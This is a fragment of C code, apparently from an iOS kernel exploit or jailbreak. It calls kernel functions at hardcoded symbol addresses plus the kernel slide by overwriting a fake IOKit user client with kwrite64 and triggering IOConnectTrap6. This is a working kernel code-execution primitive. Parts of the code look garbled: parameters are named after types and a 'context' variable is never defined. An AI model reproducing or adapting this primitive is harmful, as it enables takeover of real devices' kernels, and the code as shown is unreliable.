...
errno_t vnode_lookup(const char *path, int flags, vnode_t *vnode_t, uint64_t vfs_context_t){
    extern uint64_t kslide;
    ///iX & i8 these two offsets are the same
    uint64_t ksym_vnode_lookup = 0xfffffff00722c0d0;
    uint64_t ksym_vfs_context_current = 0xfffffff00724ae40;
    ...
    // : do not follow symbolic links. VNODE_LOOKUP_NOCROSSMOUNT:
    // vnode_put(vnode);
    kMexecute(ksym_vnode_lookup + kslide, path, 0, vnode_t, context); //execute vnode_lookup()
...
uint64_t kMexecute( uint64_t addr, const char* addr1, uint64_t x0, uint64_t vnode, uint64_t x2) {
    ...
    kwrite64(fake_client+0x40, x0);
    kwrite64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, (uint64_t)(addr1), 0, (vnode_t)(vnode), (uint64_t)(x2), 0, 0 ,0);
    kwrite64(fake_client+0x40, offx20);
    kwrite64(fake_client+0x48, offx28);
